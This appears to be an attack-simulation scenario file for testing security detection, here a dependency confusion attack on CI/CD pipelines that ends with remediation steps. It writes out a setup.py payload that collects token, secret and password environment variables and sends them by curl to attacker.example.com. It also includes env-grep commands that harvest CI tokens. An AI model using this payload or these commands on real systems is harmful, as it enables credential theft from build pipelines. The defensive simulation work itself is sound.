name: Dependency Confusion Token Theft
description: Attacker publishes a malicious package to a public registry with the same name as an internal package, causing the CI/CD pipeline to install the malicious version which steals tokens during install
real_world_relevance: Alex Birsan's dependency confusion research (2021) affecting Apple, Microsoft, PayPal; ua-parser-js npm hijack (2021); event-stream supply chain attack (2018)

techniques.name: Supply Chain Compromise: Compromise Software Dependencies and Development Tools

attack_flow.description: Attacker exploits package manager resolution to inject malicious code that runs during installation and exfiltrates CI/CD tokens
diagram: 1. Attacker identifies internal package name from public references
2. Publishes higher-version malicious package to public registry
3. CI/CD pipeline runs 'npm install' or 'pip install'
4. Package manager resolves public malicious package (higher version wins)
5. Malicious postinstall script harvests CI tokens and secrets
6. Stolen credentials exfiltrated to attacker C2

phases.name: Internal Package Discovery
phases.description: Identify internal package names from public sources

actions.command: cat /runner/_work/package.json 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); [print(k) for k in d.get("dependencies",{})]' 2>/dev/null || echo 'No package.json found'
cat /runner/_work/requirements.txt 2>/dev/null || cat /runner/_work/Pipfile 2>/dev/null || echo 'No Python deps found'

phases.name: Malicious Package Simulation
phases.description: Simulate installation of a dependency-confusion package that steals tokens

actions.command:
mkdir -p /tmp/malicious-pkg && cat > /tmp/malicious-pkg/setup.py << 'EVIL'
import os, subprocess
def exfil():
    tokens = {k:v for k,v in os.environ.items() if any(s in k.upper() for s in ['TOKEN','SECRET','KEY','PASSWORD'])}
    subprocess.run(['curl', '-s', '-d', str(tokens), 'http://attacker.example.com/exfil'])
exfil()
EVIL
echo 'Malicious package payload created'
actions.description: Create simulated malicious package with token theft payload

actions.command: env | grep -iE 'TOKEN|SECRET|KEY|NPM|PIP|PYPI' 2>/dev/null || echo 'Checking for package manager tokens'
actions.description: Verify CI/CD tokens accessible during package install

phases.name: Token Exfiltration
phases.description: Simulate the credential exfiltration that occurs during malicious package install

actions.command: env | grep -iE 'GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|NPM_TOKEN|PYPI_TOKEN|CI_JOB_TOKEN' 2>/dev/null || echo 'No CI tokens found'
actions.description: Extract CI/CD tokens that would be stolen during install

indicators_of_compromise.description: Dependency installation with credential access patterns

expected_wazuh_alerts.description: NHI: Dependency installation with credential access

immediate: Rotate all CI/CD tokens and secrets exposed during the incident
Audit package installation logs for unexpected packages
Remove the malicious package from the build cache
long_term: Configure private registry priority (npm: registry scope, pip: --index-url)
Use package lockfiles (package-lock.json, Pipfile.lock) with integrity hashes
Implement package allowlisting in CI/CD pipelines
Use tools like Socket.dev or Snyk to detect suspicious package behavior
Register internal package names on public registries (defensive squatting)
